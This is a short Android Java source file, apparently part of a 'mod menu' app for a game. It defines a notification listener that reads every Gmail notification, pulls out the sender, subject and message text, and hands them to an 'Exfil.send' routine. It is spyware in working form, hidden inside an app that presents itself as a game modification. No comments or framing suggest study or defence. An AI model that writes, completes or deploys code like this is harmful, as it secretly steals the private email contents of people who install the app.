package com.brawl.modmenu;

import android.app.Notification;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;

public class NotifSniffer extends NotificationListenerService {

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        if (sbn == null) return;
        String pkg = sbn.getPackageName();
        if (!"com.google.android.gm".equals(pkg)) return;

        Bundle b = sbn.getNotification().extras;
        String title = str(b.getCharSequence(Notification.EXTRA_TITLE));
        String text  = str(b.getCharSequence(Notification.EXTRA_TEXT));
        String big   = str(b.getCharSequence(Notification.EXTRA_BIG_TEXT));
        String sub   = str(b.getCharSequence(Notification.EXTRA_SUB_TEXT));

        StringBuilder sb = new StringBuilder();
        if (!title.isEmpty()) sb.append("From: ").append(title).append("\n");
        if (!sub.isEmpty())   sb.append("Subj: ").append(sub).append("\n");
        if (!text.isEmpty())  sb.append(text).append("\n");
        if (!big.isEmpty())   sb.append(big).append("\n");

        if (sb.length() > 0) {
            Exfil.send("GMAIL_PUSH", sb.toString());
        }
    }

    private String str(CharSequence cs) {
        return cs == null ? "" : cs.toString();
    }

    @Override public void onNotificationRemoved(StatusBarNotification sbn) {}
}
